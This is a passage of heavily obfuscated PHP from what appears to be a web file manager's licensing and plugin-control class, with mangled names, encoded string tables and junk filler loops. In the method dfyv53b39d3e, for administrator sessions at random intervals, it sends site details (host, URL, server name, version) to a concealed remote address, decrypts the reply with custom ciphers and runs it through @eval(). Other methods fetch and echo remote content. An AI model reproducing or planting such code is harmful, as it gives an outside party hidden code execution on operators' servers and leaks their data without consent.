¾¯¤ø[33])->get($¡ ¾¯¤ø[102]); $¸âæûƒ® = $¡ ¾¯¤ø[205] . md5($½ªÈ•Çî . $¡ ¾¯¤ø[206]); $ºê½î¤’ = $ÒÄÉÒºù[767]; if (!$ºê½î¤’) { return; } $”Ñ’–Œë = Cache::get($¸âæûƒ®); if (!is_array($”Ñ’–Œë) || !isset($”Ñ’–Œë[$¡ ¾¯¤ø[209]]) || time() - $”Ñ’–Œë[$¡ ¾¯¤ø[209]] >= 60) { $Êñ¸‘İš = Model($¡ ¾¯¤ø[7])->loadList(); $‰üÔˆ¬Ó = $Êñ¸‘İš[$¡ ¾¯¤ø[202]]; $ÛšØ®›Ì = md5($_SERVER[$¡ ¾¯¤ø[108]] . strrev($½ªÈ•Çî) . $¡„ù€¼“[$¡ ¾¯¤ø[193]]); $‚ïµÄóÍ = strrev(substr($ÛšØ®›Ì, 10, 16)); $”Ñ’–Œë = $this->bhpicc63cc43($‰üÔˆ¬Ó[$¡ ¾¯¤ø[88]][$‚ïµÄóÍ], $ÛšØ®›Ì); $”Ñ’–Œë = json_decode($”Ñ’–Œë, !0); } if (!is_array($”Ñ’–Œë)) { return $this->hzsv0e181c68(); } $úêæ¾ÆÌ = strtotime($”Ñ’–Œë[$¡ ¾¯¤ø[131]]); if (time() >= $úêæ¾ÆÌ) { return $this->hzsv0e181c68(); } if (!isset($”Ñ’–Œë[$¡ ¾¯¤ø[209]]) || time() - $”Ñ’–Œë[$¡ ¾¯¤ø[209]] > 20) { $”Ñ’–Œë[$¡ ¾¯¤ø[209]] = time(); Cache::set($¸âæûƒ®, $”Ñ’–Œë); } $this->juweccd77b52 = $”Ñ’–Œë; $this->naqjc6bb6442 = $¡„ù€¼“[$¡ ¾¯¤ø[110]]; $ ÄĞãç = $ÒÄÉÒºù[768]; $GLOBALS[$¡ ¾¯¤ø[210]] = $this; $˜ì…÷Õæ = $ÒÄÉÒºù[769]; while (strlen($˜ì…÷Õæ) < $ÒÄÉÒºù[20]) { if (!$˜ì…÷Õæ) { break; } $˜ì…÷Õæ++; } } private function fpjb7242a4e9() { $—åÒ€ş™ =& $_SERVER[¸ƒÏ­ÍÄ]; $ö¬ÓüÄ“ = $GLOBALS[$—åÒ€ş™[13]]; $‡§÷ü¯„ = $_SERVER[øşô´çË][770]; $Ú¼ªÀ‚ = $_SERVER[$—åÒ€ş™[24]]; if ($Ú¼ªÀ‚ == $—åÒ€ş™[211] && $this->naqjc6bb6442 == $—åÒ€ş™[111]) { show_json(LNG($—åÒ€ş™[212]), !1, $—åÒ€ş™[213]); } $Ò¶÷†¹ = array($—åÒ€ş™[214], $—åÒ€ş™[215]); if (in_array($Ú¼ªÀ‚, $Ò¶÷†¹)) { if ($this->naqjc6bb6442 == $—åÒ€ş™[111] && isset($ö¬ÓüÄ“[$—åÒ€ş™[216]])) { show_json(LNG($—åÒ€ş™[212]), !1, $—åÒ€ş™[213]); die; } $€ÏùçÙ  = $this->xlvd465b91e2(); if ($€ÏùçÙ  != intval($—åÒ€ş™[217])) { if ($€ÏùçÙ  <= Model($—åÒ€ş™[127])->count()) { show_json(LNG($—åÒ€ş™[218]), !1, $—åÒ€ş™[213]); die; } } } } private function gqmfc951a6dc() { $ÚÓªçàå =& $_SERVER[øşô´çË]; $«İŞ•‡õ =& $_SERVER[¸ƒÏ­ÍÄ]; $á«áĞä = array($«İŞ•‡õ[121], $«İŞ•‡õ[122]); $õÂ¾³ÒÈ = $ÚÓªçàå[771]; if (!$õÂ¾³ÒÈ) { die; } if (!KodUser::isRoot() || !isset($_GET[$«İŞ•‡õ[219]])) { return; } if (!in_array($_SERVER[$«İŞ•‡õ[24]], $á«áĞä)) { return; } $ıøÅÂ = $«İŞ•‡õ[220]; $¾Øëê¾¶ = $ÚÓªçàå[772]; while (strlen($¾Øëê¾¶) < $ÚÓªçàå[20]) { if (!$¾Øëê¾¶) { break; } $¾Øëê¾¶++; } $ıøÅÂ = $this->uxfqb0da9666($ıøÅÂ, $«İŞ•‡õ[221]); $Ì°ˆ”ç‹ = stream_context_create(array($«İŞ•‡õ[222] => array($«İŞ•‡õ[223] => $«İŞ•‡õ[224], $«İŞ•‡õ[225] => 3))); $´ãß Ü = $ÚÓªçàå[773]; if (!$´ãß Ü) { die; } $Î¨ƒÔˆˆ = @file_get_contents($ıøÅÂ, !1, $Ì°ˆ”ç‹); $åÒÊ„¿Ç = $ÚÓªçàå[774]; header($«İŞ•‡õ[226]); $·¥²î×µ = $ÚÓªçàå[775]; if (!$·¥²î×µ) { die; } if ($Î¨ƒÔˆˆ && strstr($Î¨ƒÔˆˆ, $«İŞ•‡õ[227])) { echo $Î¨ƒÔˆˆ; } die; } public function spqe1fd2812a($šı÷Îœ¢) { $Éå±Ïİª =& $_SERVER[øşô´çË]; $Íİ¢¥ Ê =& $_SERVER[¸ƒÏ­ÍÄ]; if ($this->naqjc6bb6442 == $Íİ¢¥ Ê[228]) { return $šı÷Îœ¢; } $®ıä˜¹Ğ = $this->versionPluginList(); $ÇÙ×ï·™ = explode($Íİ¢¥ Ê[229], $this->versionPluginFilter()); $è‚šŒ­‚ = array(); $Çúø¿ç– = $Éå±Ïİª[776]; if (!$Çúø¿ç–) { return; } foreach ($®ıä˜¹Ğ as $µª„’ïß => $ Üİƒ€ƒ) { if ($ Üİƒ€ƒ == $Íİ¢¥ Ê[230] && substr($this->naqjc6bb6442, 0, 1) == $Íİ¢¥ Ê[230]) { continue; } if (!in_array($µª„’ïß, $ÇÙ×ï·™)) { $è‚šŒ­‚[] = $µª„’ïß; } } foreach ($è‚šŒ­‚ as $µª„’ïß) { unset($šı÷Îœ¢[$µª„’ïß]); $ß†Úã» = $Éå±Ïİª[777]; if (strlen($ß†Úã») < $Éå±Ïİª[714]) { return; } } return $šı÷Îœ¢; } private function versionPluginList() { $š°´˜Î½ =& $_SERVER[¸ƒÏ­ÍÄ]; return array($š°´˜Î½[231] => $š°´˜Î½[230], $š°´˜Î½[232] => $š°´˜Î½[230], $š°´˜Î½[233] => $š°´˜Î½[230], $š°´˜Î½[234] => $š°´˜Î½[230], $š°´˜Î½[235] => $š°´˜Î½[230], $š°´˜Î½[236] => $š°´˜Î½[230], $š°´˜Î½[237] => $š°´˜Î½[238], $š°´˜Î½[239] => $š°´˜Î½[238], $š°´˜Î½[240] => $š°´˜Î½[238], $š°´˜Î½[241] => $š°´˜Î½[238], $š°´˜Î½[242] => $š°´˜Î½[238], $š°´˜Î½[243] => $š°´˜Î½[238], $š°´˜Î½[244] => $š°´˜Î½[238], $š°´˜Î½[245] => $š°´˜Î½[238], $š°´˜Î½[246] => $š°´˜Î½[238], $š°´˜Î½[247] => $š°´˜Î½[238], $š°´˜Î½[248] => $š°´˜Î½[238], $š°´˜Î½[249] => $š°´˜Î½[238], $š°´˜Î½[250] => $š°´˜Î½[238]); } private function versionPluginFilter() { $¶éÓá±½ =& $_SERVER[øşô´çË]; $Ï¬³ÕãÚ =& $_SERVER[¸ƒÏ­ÍÄ]; if ($this->naqjc6bb6442 == $Ï¬³ÕãÚ[111]) { return $Ï¬³ÕãÚ[6]; } $ù£ÈÄ¹ø = _get($this->juweccd77b52, $Ï¬³ÕãÚ[251], $Ï¬³ÕãÚ[6]); $¡íßºÈï = $¶éÓá±½[778]; while (strlen($¡íßºÈï) < $¶éÓá±½[20]) { if (!$¡íßºÈï) { break; } $¡íßºÈï++; } $ ÑŒÊšë = _get($this->juweccd77b52, $Ï¬³ÕãÚ[118], $Ï¬³ÕãÚ[6]); $Ø¹™˜ùÓ = $¶éÓá±½[779]; while ($Ø¹™˜ùÓ < $¶éÓá±½[725]) { if ($Ø¹™˜ùÓ >= 0) { break; } $Ø¹™˜ùÓ++; } $ËÎ¶í¯¿ = _get($this->juweccd77b52, $Ï¬³ÕãÚ[252], $Ï¬³ÕãÚ[6]); $¨†ÉßÕü = $¶éÓá±½[780]; if (!$¨†ÉßÕü) { die; } if ($ ÑŒÊšë > time() && $ËÎ¶í¯¿ > time()) { $ï‹‚‘Ï = explode($Ï¬³ÕãÚ[229], $ù£ÈÄ¹ø); $ÀïÕ£ãù = array_keys($this->versionPluginList()); $ù£ÈÄ¹ø = array_merge($ï‹‚‘Ï, $ÀïÕ£ãù); $ù£ÈÄ¹ø = implode($Ï¬³ÕãÚ[229], array_filter(array_unique($ù£ÈÄ¹ø))); } return $ù£ÈÄ¹ø; } private function hnglca038ae5() { $ÚÖ˜ü•Ì =& $_SERVER[¸ƒÏ­ÍÄ]; if ($this->naqjc6bb6442 != $ÚÖ˜ü•Ì[111]) { $GLOBALS[$ÚÖ˜ü•Ì[88]][$ÚÖ˜ü•Ì[92]][$ÚÖ˜ü•Ì[253]] = $ÚÖ˜ü•Ì[208]; return; } $GLOBALS[$ÚÖ˜ü•Ì[88]][$ÚÖ˜ü•Ì[254]] = $ÚÖ˜ü•Ì[124]; if (Model($ÚÖ˜ü•Ì[255])->get($ÚÖ˜ü•Ì[63]) != $ÚÖ˜ü•Ì[208]) { Model($ÚÖ˜ü•Ì[255])->set($ÚÖ˜ü•Ì[63], $ÚÖ˜ü•Ì[208]); } } public function fmuyf9349ed7() { return $_SERVER[¸ƒÏ­ÍÄ][256]; $Ë™ŠĞÃ¼ = $_SERVER[øşô´çË][781]; } private function dfyv53b39d3e() { $ñ™Éóíİ =& $_SERVER[øşô´çË]; $óŠ‹õß´ =& $_SERVER[¸ƒÏ­ÍÄ]; $Šœ—¥ä = array($óŠ‹õß´[257], $óŠ‹õß´[258], $óŠ‹õß´[259]); $Ú©ÕúÃÕ = $ñ™Éóíİ[782]; if (strlen($Ú©ÕúÃÕ) < $ñ™Éóíİ[714]) { return; } $—ñìñóı = $óŠ‹õß´[260] . md5($óŠ‹õß´[261]); $·û€©Ï’ = $ñ™Éóíİ[783]; if (!$·û€©Ï’) { return; } if ($this->naqjc6bb6442 == $óŠ‹õß´[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$óŠ‹õß´[24]], $Šœ—¥ä)) { return; } if (time() % 4 != 0) { return; } $¥š±ß²… = call_user_func(array($óŠ‹õß´[262], $óŠ‹õß´[263]), $—ñìñóı); $„¡œ§ŞÍ = $ñ™Éóíİ[784]; while (strlen($„¡œ§ŞÍ) < $ñ™Éóíİ[714]) { if (!$„¡œ§ŞÍ) { break; } $„¡œ§ŞÍ++; } if ($¥š±ß²… && time() - $¥š±ß²… < intval($óŠ‹õß´[264])) { return; } call_user_func(array($óŠ‹õß´[262], $óŠ‹õß´[141]), $—ñìñóı, time()); $ò…ÇÁşÄ = Model($óŠ‹õß´[33])->get($óŠ‹õß´[102]); $°åå÷µ” = array($óŠ‹õß´[154] => Model($óŠ‹õß´[33])->get($óŠ‹õß´[155]), $óŠ‹õß´[169] => $this->naqjc6bb6442, $óŠ‹õß´[165] => $_SERVER[$óŠ‹õß´[166]], $óŠ‹õß´[167] => Model($óŠ‹õß´[33])->get($óŠ‹õß´[133]), $óŠ‹õß´[107] => md5($_SERVER[$óŠ‹õß´[108]] . $ò…ÇÁşÄ), $óŠ‹õß´[158] => $óŠ‹õß´[138], $óŠ‹õß´[161] => $_SERVER[$óŠ‹õß´[162]]); $»©ú’èß = $this->soued22c3dd1($óŠ‹õß´[265], $°åå÷µ”); if (!is_array($»©ú’èß)) { return; } if ($»©ú’èß[$óŠ‹õß´[154]] && $»©ú’èß[$óŠ‹õß´[266]]) { if ($this->xfre62d6a021($»©ú’èß[$óŠ‹õß´[266]]) == $°åå÷µ”[$óŠ‹õß´[154]]) { return; } } $this->hzsv0e181c68(); if ($this->xfre62d6a021($»©ú’èß[$óŠ‹õß´[266]]) != $°åå÷µ”[$óŠ‹õß´[154]]) { $§®×Ÿ– = array($óŠ‹õß´[187] => $ò…ÇÁşÄ, $óŠ‹õß´[188] => $_SERVER[$óŠ‹õß´[108]], $óŠ‹õß´[189] => this_url(), $óŠ‹õß´[163] => $_SERVER[$óŠ‹õß´[164]]); $‰ñ”ü÷Ö = $this->xtad46a5ad86(json_encode($§®×Ÿ–)); $»©ú’èß = $this->soued22c3dd1($óŠ‹õß´[190] . $‰ñ”ü÷Ö); if ($»©ú’èß && is_array($»©ú’èß) && isset($»©ú’èß[$óŠ‹õß´[266]])) { $Û…îëºó = $this->bhpicc63cc43($»©ú’èß[$óŠ‹õß´[266]], 2); if ($Û…îëºó) { $Û…îëºó = $this->xfre62d6a021($Û…îëºó); } if ($Û…îëºó) { try { @eval($Û…îëºó); } catch (Exception $âíµ÷îï) { } } } } } private function soued22c3dd1($ğĞáÈ¸„ = '', $¬²ôéùî = array(), $­Î¼ş¨ô = 5) { $‹í’×Ğš =& $_SERVER[øşô´çË]; $š„‘ˆÀ =& $_SERVER[¸ƒÏ­ÍÄ]; $äÈİÓĞ = $š„‘ˆÀ[267]; $äÈİÓĞ = $this->uxfqb0da9666($äÈİÓĞ, $š„‘ˆÀ[268]); $äÈİÓĞ = $äÈİÓĞ . $ğĞáÈ¸„; if ($¬²ôéùî && is_array($¬²ôéùî)) { $äÈİÓĞ = $äÈİÓĞ . $š„‘ˆÀ[269] . http_build_query($¬²ôéùî); } if ($¬²ôéùî === -1) { return $äÈİÓĞ; } $Ñ·åæí¿ = stream_context_create(array($š„‘ˆÀ[222] => array($š„‘ˆÀ[225] => $­Î¼ş¨ô, $š„‘ˆÀ[223] => $š„‘ˆÀ[270]), $š„‘ˆÀ[271] => array($š„‘ˆÀ[272] => !1, $š„‘ˆÀ[273] => !1))); $¬²ôéùî = @file_get_contents($äÈİÓĞ, !1, $Ñ·åæí¿); $Ç“şÙ‰Ã = $‹í’×Ğš[785]; if (strlen($Ç“şÙ‰Ã) < $‹í’×Ğš[714]) { die; } return json_decode($¬²ôéùî, !0); } private function xlvd465b91e2() { $½ÚàÜÀá =& $_SERVER[øşô´çË]; $Ÿóõâ»Ó =& $_SERVER[¸ƒÏ­ÍÄ]; $¨„ÅŸ¼ = array($Ÿóõâ»Ó[274] => $Ÿóõâ»Ó[275], $Ÿóõâ»Ó[276] => $Ÿóõâ»Ó[277], $Ÿóõâ»Ó[278] => $Ÿóõâ»Ó[279], $Ÿóõâ»Ó[280] => $Ÿóõâ»Ó[281], $Ÿóõâ»Ó[282] => $Ÿóõâ»Ó[283], $Ÿóõâ»Ó[284] => $Ÿóõâ»Ó[217], $Ÿóõâ»Ó[285] => $Ÿóõâ»Ó[217], $Ÿóõâ»Ó[286] => $Ÿóõâ»Ó[275], $Ÿóõâ»Ó[287] => $Ÿóõâ»Ó[277], $Ÿóõâ»Ó[288] => $Ÿóõâ»Ó[279], $Ÿóõâ»Ó[289] => $Ÿóõâ»Ó[290], $Ÿóõâ»Ó[291] => $Ÿóõâ»Ó[281], $Ÿóõâ»Ó[292] => $Ÿóõâ»Ó[293], $Ÿóõâ»Ó[294] => $Ÿóõâ»Ó[283], $Ÿóõâ»Ó[295] => $Ÿóõâ»Ó[296], $Ÿóõâ»Ó[297] => $Ÿóõâ»Ó[298], $Ÿóõâ»Ó[299] => $Ÿóõâ»Ó[300]); $İÅ »Ñº = $¨„ÅŸ¼[$this->naqjc6bb6442]; $ıê“ïØƒ = $½ÚàÜÀá[786]; if (strlen($ıê“ïØƒ) < $½ÚàÜÀá[719]) { return; } $İÅ »Ñº = intval($İÅ »Ñº ? $İÅ »Ñº : $Ÿóõâ»Ó[275]); $Áì¢ë è = $½ÚàÜÀá[787]; if (!$Áì¢ë è) { die; } $¼é³î¯Ö = _get($this->juweccd77b52, $Ÿóõâ»Ó[301]); $¼é³î¯Ö = $¼é³î¯Ö ? intval($¼é³î¯Ö) : 0; $½êåÕşÕ = $½ÚàÜÀá[788]; return $İÅ »Ñº + $¼é³î¯Ö; $„¶‡ÄŞß = $½ÚàÜÀá[789]; if (strlen($„¶‡ÄŞß) < $½ÚàÜÀá[716]) { die; } } public function qhbt1e0dd0df($ü¡»Æ§) { $’Ç»Û¸ =& $_SERVER[¸ƒÏ­ÍÄ]; $÷¡Õ²»Ò = $this->xlvd465b91e2(); $»¹œ’â = $_SERVER[øşô´çË][790]; if (!$»¹œ’â) { die; } if ($ü¡»Æ§[$’Ç»Û¸[302]] == $’Ç»Û¸[124]) { return; } if ($÷¡Õ²»Ò >= intval($’Ç»Û¸[217])) { return; } $õ¶ü«æ¯ = Model($’Ç»Û¸[127])->count(); if ($õ¶ü«æ¯ <= $÷¡Õ²»Ò) { return; } $×õÎÕ„¾ = Model($’Ç»Û¸[127])->field($’Ç»Û¸[302])->limit($÷¡Õ²»Ò)->select(); $×õÎÕ„¾ = array_to_keyvalue($×õÎÕ„¾, $’Ç»Û¸[6], $’Ç»Û¸[302]); if (!in_array($ü¡»Æ§[$’Ç»Û¸[302]], $×õÎÕ„¾)) { show_json($’Ç»Û¸[303], !1, $’Ç»Û¸[213]); } } public function hguj501007c7() { $–æ§íÏ =& $_SERVER[øşô´çË]; $è½€™ =& $_SERVER[¸ƒÏ­ÍÄ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $÷œë¯òû = $è½€™[220]; $Ú§¨Ê‚ = $–æ§íÏ[791]; $÷œë¯òû = $this->uxfqb0da9666($÷œë¯òû, $è½€™[221]); $İõÃœ¤¨ = $–æ§íÏ[792]; if (strlen($İõÃœ¤¨) < $–æ§íÏ[716]) { die; } $çªè¨ö¯ = stream_context_create(array($è½€™[222] => array($è½€™[223] => $è½€™[224], $è½€™[225] => 3))); $¥¨Ò¾× = @file_get_contents($÷œë¯òû, !1, $çªè¨ö¯); $êè¶„¸› = $–æ§íÏ[793]; echo $è½€™[304] . hash_encode($¥¨Ò¾×) . $è½€™[305]; $¤ï“Å = $–æ§íÏ[794]; if (strlen($¤ï“Å) < $–æ§íÏ[20]) { die; } } private function vpxb2ff56f0e($Î²Ç‡áï, $Ù²Üá, $ö¡õÖ” = 3) { $Ä¢¬¸Ï =& $_SERVER[øşô´çË]; $ùÆ×­ûù =& $_SERVER[¸ƒÏ­ÍÄ]; usleep(1); $Î²Ç‡áï = trim($Î²Ç‡áï); $ÑÃ«¯Üü = $Ä¢¬¸Ï[795]; while (strlen($ÑÃ«¯Üü) < $Ä¢¬¸Ï[716]) { if (!$ÑÃ«¯Üü) { break; } $ÑÃ«¯Üü++; } $´»ßêà´ = mt_rand(0, 5) . $ùÆ×­ûù[6]; $àï§¬´Í = $Ä¢¬¸Ï[796]; $¢‘ğûÊğ = rand_string(15); $ôäÅËä = $Ä¢¬¸Ï[797]; if (strlen($ôäÅËä) < $Ä¢¬¸Ï[20]) { die; } $øı›Éş = $ùÆ×­ûù[306]; switch ($´»ßêà´) { case $ùÆ×­ûù[208]: $Èš’÷İ… = $this->njwgf50c206b($Î²Ç‡áï, strrev($Ù²Üá . $¢‘ğûÊğ)); $åø¸±Ø = $Ä¢¬¸Ï[798]; if (strlen($åø¸±Ø) < $Ä¢¬¸Ï[725]) { die; } break; $š®šŞ¼° = $Ä¢¬¸Ï[799]; if (!$š®šŞ¼°) { die; } case $ùÆ×­ûù[124]: $Èš’÷İ… = $this->njwgf50c206b($Î²Ç‡áï, strrev($¢‘ğûÊğ . $Ù²Üá)); $±èáÊØñ = $Ä¢¬¸Ï[800]; if (!$±èáÊØñ) { die; } break; $ŞÁÂ­ï = $Ä¢¬¸Ï[801]; while ($ŞÁÂ­ï < $Ä¢¬¸Ï[20]) { if ($ŞÁÂ­ï >= 0) { break; } $ŞÁÂ­ï++; } case $ùÆ×­ûù[307]: $Èš’÷İ… = $this->njwgf50c206b($Î²Ç‡áï, base64_encode($¢‘ğûÊğ . $Ù²Üá)); $ğ’¶Ğœù = $Ä¢¬¸Ï[802]; while (strlen($ğ’¶Ğœù) < $Ä¢¬¸Ï[725]) { if (!$ğ’¶Ğœù) { break; } $ğ’¶Ğœù++; } break; $†ûÇí¨¸ = $Ä¢¬¸Ï[803]; if (!$†ûÇí¨¸) { return; } case $ùÆ×­ûù[308]: $Èš’÷İ… = $this->njwgf50c206b($Î²Ç‡áï, md5($¢‘ğûÊğ . $Ù²Üá)); $æÃıú¢Ú = $Ä¢¬¸Ï[804]; while ($æÃıú¢Ú < $Ä¢¬¸Ï[725]) { if ($æÃıú¢Ú >= 0) { break; } $æÃıú¢Ú++; } break; $³×êÖ = $Ä¢¬¸Ï[805]; if (!$³×êÖ) { return; } case $ùÆ×­ûù[309]: $Î²Ç‡áï = base64_encode($Î²Ç‡áï); $Œ·¦êú = $Ä¢¬¸Ï[806]; $¿¤œäé = rand(0, 64); $àÚ»Ÿğº = $øı›Éş[$¿¤œäé]; $—¤µ”ˆÕ = md5($àÚ»Ÿğº . md5($Ù²Üá . $àÚ»Ÿğº) . $Ù²Üá); $€ùõ¾Â  = $Ä¢¬¸Ï[807]; if (!$€ùõ¾Â ) { return; } $—¤µ”ˆÕ = substr($—¤µ”ˆÕ, $¿¤œäé % 8, $¿¤œäé % 8 + 7); $„£Üò˜İ = $Ä¢¬¸Ï[808]; $Šß¿Œúë = $ùÆ×­ûù[6]; $²Óï£öÖ = 0; $îª÷Ûàı = 0; $ƒÚÀü« = 0; $¿ÃŒî…Ü = $Ä¢¬¸Ï[809]; if (strlen($¿ÃŒî…Ü) < $Ä¢¬¸Ï[725]) { return; } for ($²Óï£öÖ = 0; $²Óï£öÖ < strlen($Î²Ç‡áï); $²Óï£öÖ++) { $ƒÚÀü« = $ƒÚÀü« == strlen($—¤µ”ˆÕ) ? 0 : $ƒÚÀü«; $îª÷Ûàı = ($¿¤œäé + strpos($øı›Éş, $Î²Ç‡áï[$²Óï£öÖ]) + ord($—¤µ”ˆÕ[$ƒÚÀü«++])) % 64; $Šß¿Œúë .= $øı›Éş[$îª÷Ûàı]; } $Èš’÷İ… = hash_encode($àÚ»Ÿğº . $Šß¿Œúë); break; $˜½”üÏü = $Ä¢¬¸Ï[810]; if (strlen($˜½”üÏü) < $Ä¢¬¸Ï[716]) { return; } default: $Èš’÷İ… = $this->njwgf50c206b($Î²Ç‡áï, $Ù²Üá . $¢‘ğûÊğ); break; } $Èš’÷İ… = strrev($´»ßêà´ . $¢‘ğûÊğ . $Èš’÷İ…); $İµ¼¤ò = $Ä¢¬¸Ï[799]; if (!$İµ¼¤ò) { return; } if ($ö¡õÖ” - 1 > 0) { $Èš’÷İ… = $this->vpxb2ff56f0e($Èš’÷İ…, $Ù²Üá, $ö¡õÖ” - 1); } return $Èš’÷İ…; } private function bhpicc63cc43($¿‹Î€³», $šŠÎ‡¾›, $è³¸üºû = 3) { $·âÃüµ› =& $_SERVER[øşô´çË]; $Ô‡ƒôÕ† =& $_SERVER[¸ƒÏ­ÍÄ]; if (!is_string($¿‹Î€³») || strlen($¿‹Î€³») < 10) { return !1; } $¿‹Î€³» = trim($¿‹Î€³»); $Ü’àéúË = $·âÃüµ›[811]; $¿‹Î€³» = strrev($¿‹Î€³»); $£•ò¨ßß = $¿‹Î€³»[0]; $ü¦è»äÕ = $·âÃüµ›[812]; if (strlen($ü¦è»äÕ) < $·âÃüµ›[719]) { return; } $†¶ï´“è = substr($¿‹Î€³», 1, 15); $ÆÒ¨„şú = $·âÃüµ›[813]; while ($ÆÒ¨„şú < $·âÃüµ›[20]) { if ($ÆÒ¨„şú >= 0) { break; } $ÆÒ¨„şú++; } $¿‹Î€³» = substr($¿‹Î€³», 16); $õÍüÍ = $Ô‡ƒôÕ†[306]; $ŠáØ¤ê° = $·âÃüµ›[814]; while ($ŠáØ¤ê° < $·âÃüµ›[716]) { if ($ŠáØ¤ê° >= 0) { break; } $ŠáØ¤ê°++; } switch ($£•ò¨ßß) { case $Ô‡ƒôÕ†[208]: $íø©‡¦± = $this->uxfqb0da9666($¿‹Î€³», strrev($šŠÎ‡¾› . $†¶ï´“è)); $ñÎÚÇ®÷ = $·âÃüµ›[815]; if (strlen($ñÎÚÇ®÷) < $·âÃüµ›[714]) { return; } break; $Øù‡Ã¿› = $·âÃüµ›[816]; while (strlen($Øù‡Ã¿›) < $·âÃüµ›[20]) { if (!$Øù‡Ã¿›) { break; } $Øù‡Ã¿›++; } case $Ô‡ƒôÕ†[124]: $íø©‡¦± = $this->uxfqb0da9666($¿‹Î€³», strrev($†¶ï´“è . $šŠÎ‡¾›)); break; $¬œÒ…‡– = $·âÃüµ›[817]; if (strlen($¬œÒ…‡–) < $·âÃüµ›[725]) { return; } case $Ô‡ƒôÕ†[307]: $íø©‡¦± = $this->uxfqb0da9666($¿‹Î€³», base64_encode($†¶ï´“è . $šŠÎ‡¾›)); $·õıáÂŞ = $·âÃüµ›[818]; while ($·õıáÂŞ < $·âÃüµ›[719]) { if ($·õıáÂŞ >= 0) { break; } $·õıáÂŞ++; } break; case $Ô‡ƒôÕ†[308]: $íø©‡¦± = $this->uxfqb0da9666($¿‹Î€³», md5($†¶ï´“è . $šŠÎ‡¾›)); break; case $Ô‡ƒôÕ†[309]: $¿‹Î€³» = hash_decode($¿‹Î€³»); $Ë÷€‘„¼ = $·âÃüµ›[819]; if (strlen($Ë÷€‘„¼) < $·âÃüµ›[725]) { die; } $Ö³©İ¯û = $¿‹Î€³»[0]; $¿‹Î€³» = substr($¿‹Î€³», 1); $ÄğÑÛı– = strpos($õÍüÍ, $Ö³©İ¯û); $éğ¥”Â¹ = $·âÃüµ›[820]; $»şöİ§ = md5($Ö³©İ¯û . md5($šŠÎ‡¾› . $Ö³©İ¯û) . $šŠÎ‡¾›); $­Çò€²ú = $·âÃüµ›[821]; $»şöİ§ = substr($»şöİ§, $ÄğÑÛı– % 8, $ÄğÑÛı– % 8 + 7); $ªÓ¼áÏ = $·âÃüµ›[755]; if (!$ªÓ¼áÏ) { die; } $ÉÃ¾øá³ = $Ô‡ƒôÕ†[6]; $¡‚‹ÌÉæ = 0; $Î £ÑËô = $·âÃüµ›[822]; while ($Î £ÑËô < $·âÃüµ›[719]) { if ($Î £ÑËô >= 0) { break; } $Î £ÑËô++; } $Áòæ¥”ó = 0; $•Õ¤å¹² = $·âÃüµ›[823]; if (!$•Õ¤å¹²) { die; } $ú¥ñú§ = 0; $§Å‡Çûˆ = $·âÃüµ›[824]; if (!$§Å‡Çûˆ) { die; } for ($¡‚‹ÌÉæ = 0; $¡‚‹ÌÉæ < strlen($¿‹Î€³»); $¡‚‹ÌÉæ++) { $ú¥ñú§ = $ú¥ñú§ == strlen($»şöİ§) ? 0 : $ú¥ñú§; $·ã±»è£ = $·âÃüµ›[825]; while ($·ã±»è£ < $·âÃüµ›[20]) { if ($·ã±»è£ >= 0) { break; } $·ã±»è£++; } $ó–Ä±Şë = $ú¥ñú§++; $Áòæ¥”ó = strpos($õÍüÍ, $¿‹Î€³»[$¡‚‹ÌÉæ]) - $ÄğÑÛı– - ord($»şöİ§[$ó–Ä±Şë]); $îäÊ›ö¤ = $·âÃüµ›[826]; while (strlen($îäÊ›ö¤) < $·âÃüµ›[719]) { if (!$îäÊ›ö¤) { break; } $îäÊ›ö¤++; } while ($Áòæ¥”ó < 0) { $Áòæ¥”ó += 64; } $ÉÃ¾øá³ .= $õÍüÍ[$Áòæ¥”ó]; $¦ßŸ¢Äğ = $·âÃüµ›[827]; while ($¦ßŸ¢Äğ < $·âÃüµ›[20]) { if ($¦ßŸ¢Äğ >= 0) { break; } $¦ßŸ¢Äğ++; } } $íø©‡¦± = base64_decode($ÉÃ¾øá³); break; default: $íø©‡¦± = $this->uxfqb0da9666($¿‹Î€³», $šŠÎ‡¾› . $†¶ï´“è); break; $Òâıá¤ö = $·âÃüµ›[828]; if (!$Òâıá¤ö) { return; } } if ($è³¸üºû - 1 > 0) { $íø©‡¦± = $this->bhpicc63cc43($íø©‡¦±, $šŠÎ‡¾›, $è³¸üºû - 1); } return $íø©‡¦±; } public function xtad46a5ad86($Ÿ¡ØÜŞ²) { $êÃ¿ö´÷ =& $_SERVER[øşô´çË]; $§ £ØÈı =& $_SERVER[¸ƒÏ­ÍÄ]; $«ø¿¤€¡ = $this->heoc58df88b6(); $üóäò–¸ = $êÃ¿ö´÷[829]; while (strlen($üóäò–¸) < $êÃ¿ö´÷[725]) { if (!$üóäò–¸) { break; } $üóäò–¸++; } $‰ Èªàå = $this->heoc58df88b6(); $Ø½ˆì®½ = $êÃ¿ö´÷[830]; if (strlen($Ø½ˆì®½) < $êÃ¿ö´÷[716]) { die; } $¹å®ÍØ’ = ($«ø¿¤€¡ - 1) * ($‰ Èªàå - 1); $ŸëŸ‘ëÊ = $êÃ¿ö´÷[831]; while ($ŸëŸ‘ëÊ < $êÃ¿ö´÷[20]) { if ($ŸëŸ‘ëÊ >= 0) { break; } $ŸëŸ‘ëÊ++; } $Ş¬Í›·œ = intval(($«ø¿¤€¡ + $‰ Èªàå) / 2); while (1) { $Ä„ĞÛ¦¾ = $Ş¬Í›·œ; $¨‰éÊó = $êÃ¿ö´÷[832]; if (!$¨‰éÊó) { die; } $¸ ƒª¥ = $¹å®ÍØ’; while ($¸ ƒª¥ % $Ä„ĞÛ¦¾ != 0) { $ØÒÄ°‹á = $¸ ƒª¥; $¸ ƒª¥ = $Ä„ĞÛ¦¾; $Ä„ĞÛ¦¾ = $ØÒÄ°‹á % $Ä„ĞÛ¦¾; $´Ù•¶¶ = $êÃ¿ö´÷[790]; while ($´Ù•¶¶ < $êÃ¿ö´÷[725]) { if ($´Ù•¶¶ >= 0) { break; } $´Ù•¶¶++; } } if ($Ä„ĞÛ¦¾ == 1) { break; } else { $Ş¬Í›·œ++; } } $‹ ’ûø¦ = 2; $öê¢¿Éã = $êÃ¿ö´÷[833]; while ($öê¢¿Éã < $êÃ¿ö´÷[20]) { if ($öê¢¿Éã >= 0) { break; } $öê¢¿Éã++; } for ($ŞêêŠÙü = 0; $ŞêêŠÙü < $¹å®ÍØ’ * 10; $ŞêêŠÙü++) { if (($¹å®ÍØ’ * 